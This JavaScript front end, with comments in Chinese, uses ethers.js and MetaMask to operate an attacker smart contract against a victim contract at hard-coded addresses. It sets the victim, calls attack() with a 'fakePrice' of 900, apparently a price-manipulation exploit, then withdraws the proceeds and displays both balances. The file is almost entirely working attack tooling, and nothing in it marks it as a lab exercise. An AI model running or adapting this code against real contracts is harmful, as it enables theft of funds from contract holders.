const attackerContractAddress = "0x244245ba4695aF2b4ea80AccAcb58d2d8C49023e";
const victimContractAddress = "0x460690Ee9FDf4D66f4876b16c981Eea906C0C72a";

// 攻擊合約的 ABI（只需 attack() 函式）
const attackerAbi = [
  "function attack(uint256 fakePrice) external",
  "function withdraw() external",
  "function setVictim(address) external",
  "function owner() view returns (address)",
  "function victim() view returns (address)"
];
console.log("💡 當前接的 Attacker 地址:", attackerContractAddress);

// Victim ABI 只用來查詢餘額，不需函式

let provider, signer, attackerContract;
// provider：接 Metamask 提供的鏈（像是 RPC）
// signer：取得使用者帳戶（Metamask 的帳號）
// attackerContract：可以跟合約互動的物件（呼叫 attack 用）

document.getElementById("connect").onclick = async () => {
  if (!window.ethereum) {
    alert("請安裝 Metamask");
    return;
  }

  

  provider = new ethers.BrowserProvider(window.ethereum);
  await provider.send("eth_requestAccounts", []);
  signer = await provider.getSigner();

  attackerContract = new ethers.Contract(attackerContractAddress, attackerAbi, signer);

  //幹我不知道不加的話有時候Victim地址會變0
  const txSet = await attackerContract.setVictim(victimContractAddress);
  await txSet.wait();
  console.log("已設定 victim:", await attackerContract.victim());

  console.log("合约 owner():", await attackerContract.owner());
  console.log("合约 victim():", await attackerContract.victim());

  console.log("合约 Interface:", attackerContract.interface);

  // 修改按鈕文字與顏色
  const connectBtn = document.getElementById("connect");
  connectBtn.innerText = "已連線";
  connectBtn.style.backgroundColor = "green";
  connectBtn.style.color = "white";

  // 顯示錢包地址（可選）
  const addressSpan = document.getElementById("wallet-address");
  if (addressSpan) {
    addressSpan.innerText = await signer.getAddress();
  }

  updateVictimBalance();
  updateAttackerBalance()
};

document.getElementById("attack").onclick = async () => {
  if (!attackerContract) {
    alert("請先連接錢包");
    return;
  }

  // 在真正送交易前，先用 eth_call（Ethers.js 的 callStatic）跑一次，
  // 不會改到鏈上，但能拿到 Solidity revert 的 reason：
  try {
    await attackerContract.attack.staticCall(900);
    } catch (err) {
    // ethers v6 的 revert 原因可能在 err.error.message 或 err.reason
    console.error("staticCall revert:", err.error?.message || err.reason || err.message);
    }

  try {
    // 發送交易
    const tx = await attackerContract.attack(900);
    console.log("交易送出:", tx.hash);

    // 等待交易完成（只要等一次就夠）
    await tx.wait();
    alert("攻擊完成！");
    
    // 更新前後餘額
    await updateAttackerBalance();
    await updateVictimBalance();

  } catch (err) {
    console.error("攻擊失敗:", err);

    // MetaMask 拒絕簽名的錯誤碼是 4001
    if (err.code === 4001) {
      alert("你取消了交易簽名");
    } else {
      alert("攻擊失敗，請查看 Console 錯誤訊息");
    }
  }
};

document.getElementById("withdraw").onclick = async () => {
  if (!attackerContract) {
    alert("請先連接錢包");
    return;
  }

  try {
    const tx = await attackerContract.withdraw();
    await tx.wait();
    alert("提款完成！");
    await tx.wait();    
    updateAttackerBalance();
  } catch (err) {
    console.error("提款失敗:", err);
    alert("提款失敗，請查看 Console！");
  }
};


async function updateVictimBalance() {
  const balance = await provider.getBalance(victimContractAddress);
  const eth = ethers.formatEther(balance);
  document.getElementById("victim-balance").innerText = eth;
}

async function updateAttackerBalance() {
  if (!provider) return;
  const balance = await provider.getBalance(attackerContractAddress);
  const eth = ethers.formatEther(balance);
  document.getElementById("attacker-balance").innerText = eth;
}
